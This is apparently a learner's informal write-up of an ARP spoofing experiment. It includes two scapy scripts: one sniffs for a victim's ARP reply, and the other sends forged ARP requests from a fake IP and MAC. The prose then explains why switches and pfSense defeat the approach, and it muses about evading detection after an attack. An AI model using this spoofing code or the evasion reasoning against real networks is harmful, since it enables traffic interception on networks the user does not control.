ok, this part we using 2 scripts rening at the same time ... well the sniffer will be runnign prior but you get my point: we using
2 scripts at the same time and you see my logic behind it since im not using multithread for this yet


sniffer code  *arp_poison_sniffer_5.1.py*
```python
from scapy.all import sniff, ARP,conf,get_if_hwaddr

iface = conf.iface
MyMAC = get_if_hwaddr(iface)

ip_victim = "192.168.1.101"
fake_ip = "192.168.1.45"


def packet_handler(pkt):
    victim_mac = ""
    if ARP in pkt:
        if pkt[ARP].op == 2:
            if pkt[ARP].psrc == ip_victim and pkt[ARP].pdst == fake_ip:
                victim_mac = pkt[ARP].hwsrc
                print(f"we got it guys {victim_mac}")


sniff(filter = "arp", prn = packet_handler)
```



------------------------

poison code  *arp_poison_sender_5.py*
```python
from scapy.all import conf,ARP,sendp,Ether,subprocess,get_if_addr,get_if_hwaddr

iface = conf.iface
MyIP= get_if_addr(iface)
MyMAC= get_if_hwaddr(iface)

fake_mac= "08:00:27:aa:97:97"
fake_ip= "192.168.1.45" #must be different, but on the saem subnet as the victim's
ip_victim="192.168.1.101"




subprocess.run(  [  "sudo", "ip" , "addr" , "add" , "192.168.1.45/45" , "dev" , "eth0"   ]    )

framerequest = Ether(src = MyMAC)/ARP(op = 1 , psrc = fake_ip , pdst = ip_victim , hwsrc = MyMAC)
sendp(framerequest,iface = iface, count = 1)


framerequest = Ether(src = fake_mac)/ARP(op = 1 , psrc = fake_ip , pdst = ip_victim , hwsrc = fake_mac)
sendp(framerequest,iface = iface, count = 1)

subprocess.run ( [ "sudo","ip" , "addr" , "del" , "192.168.1.45/24" , "dev" , "eth0"  ])
```

so we run the sniffer script before the posion script, and i knwo this code has some weird parts, but this was made as i was learning this
and a thing i catch later was that i was obsessed to hide my real mac address, but here is the big thing

swtiches will drop the frame. wehn we send using ether and ARP stack and senp using a fake mac address it will be sended, no problem
and will reach if correctly provided the dest ip of the victim. but when the victim will reply the swithc will recevie that frame and say
"wait a moment this mac address (fake mac address we send earlier) it is not on my CAM table better to ask and it will broadcast
but since we dont have that mac address predefined on our OS it will not catch it, because an ARP reply is unicast for this case

even tho we change our mac address to the expected it wont work. Pfsense, as im using right now going to ban us the moment it detects 
a change. will give us an experimental ip and unable to comunciate unless we go back to the original mac address it was stored

but is a lot of work because at the end we using a mac address that we defined either real or not it will be written on the arp table
of the victim(s), so is kinda inefficient. would be different if we fro mthe begining go to the network with a mac address that the router and firewall
takes as new and we can operate fro mthere with no consequences after ending out attack.
